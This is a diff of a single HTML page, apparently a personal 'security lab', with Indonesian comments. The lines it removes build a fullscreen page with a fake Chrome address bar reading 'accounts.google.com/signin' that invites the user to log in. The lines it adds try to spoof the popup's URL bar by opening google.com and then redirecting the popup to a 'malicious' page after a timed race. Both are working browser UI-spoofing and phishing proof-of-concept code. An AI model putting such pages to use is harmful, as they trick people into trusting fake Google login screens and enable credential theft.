@@ -1,66 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Chrome Security Lab - FARISSAL B</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab: History Manipulation - FARISSAL B</title>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
-        
-        /* Bar Alamat Palsu - Muncul pas Fullscreen */
-        #fake-ui {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 60px;
-            background: #fff; z-index: 9999; align-items: center; padding: 0 16px;
-            box-sizing: border-box; border-bottom: 1px solid #dadce0;
-        }
-        .address-bar {
-            background: #f1f3f4; border-radius: 24px; padding: 8px 16px;
-            width: 100%; display: flex; align-items: center; gap: 10px;
-        }
-
-        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; text-align: center; width: 80%; border: 1px solid #333; }
-        button { background: #8ab4f8; color: #000; border: none; padding: 15px; border-radius: 50px; width: 100%; font-weight: bold; cursor: pointer; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .box { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 1px solid #333; width: 85%; }
+        button { background: #ff4b2b; color: white; border: none; padding: 18px; border-radius: 50px; font-weight: bold; width: 100%; cursor: pointer; }
+        .desc { font-size: 12px; color: #9aa0a6; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
-<div id="fake-ui">
-    <div class="address-bar">
-        <span style="font-size: 16px;">🔒</span>
-        <span style="color: #202124; font-size: 14px;">accounts.google.com/signin</span>
-    </div>
-</div>
-
-<div class="card" id="main-content">
-    <h2 style="color: #8ab4f8;">Security Research</h2>
-    <p style="color: #9aa0a6;">Target: Chrome Android UI Spoofing</p>
-    <button id="launchBtn">CEK KERANAN SISTEM</button>
+<div class="box">
+    <h2>Research: History Spoof</h2>
+    <p class="desc">Teknik: Race Condition Navigasi</p>
+    
+    <button id="exploitBtn">TEST SPOOFING</button>
+    
+    <p id="status" style="margin-top:20px; font-family:monospace; color:#0f0; font-size:11px;"></p>
 </div>
 
 <script>
-    const btn = document.getElementById('launchBtn');
-    const fakeUi = document.getElementById('fake-ui');
+    const btn = document.getElementById('exploitBtn');
+    const status = document.getElementById('status');
 
     btn.addEventListener('click', () => {
-        // Masuk ke Fullscreen Mode
-        if (document.documentElement.requestFullscreen) {
-            document.documentElement.requestFullscreen().then(() => {
-                // Tampilkan UI palsu begitu masuk fullscreen
-                fakeUi.style.display = 'flex';
-                document.getElementById('main-content').innerHTML = `
-                    <h2 style="color: #4caf50;">SESSION SECURE</h2>
-                    <p>Silakan login di address bar atas.</p>
-                `;
-            });
-        } else {
-            alert("Browser lo gak support Fullscreen API.");
-        }
-    });
+        status.innerText = "Membuka jendela...";
 
-    // Deteksi kalau user keluar dari fullscreen (pencet back)
-    document.addEventListener('fullscreenchange', () => {
-        if (!document.fullscreenElement) {
-            fakeUi.style.display = 'none';
+        // 1. Buka jendela baru (target spoofing: google.com)
+        const spoofWin = window.open("https://www.google.com", "SpoofWindow", "width=500,height=600");
+
+        if (spoofWin) {
+            status.innerText = "Jendela terbuka. Menunggu race condition...";
+
+            // 2. Trik utamanya: Tunggu sebentar pas lagi loading (timing sangat krusial!)
+            setTimeout(() => {
+                // 3. Paksa jendela tersebut pindah ke halaman kita kembali
+                // Tapi karena proses navigasi google.com masih jalan, 
+                // Chrome kadang "nyangkut" nampilin URL Google padahal isinya web kita.
+                spoofWin.location.href = window.location.href + "?content=malicious";
+                
+                status.innerText = "Exploit dikirim. Cek bar alamat di jendela baru!";
+            }, 500); // 500ms adalah angka rata-rata, bisa lo ganti-ganti (200-800ms)
+
+        } else {
+            alert("Pop-up diblokir! Izinkan pop-up dulu di pojok kanan atas browser.");
         }
     });
 </script>
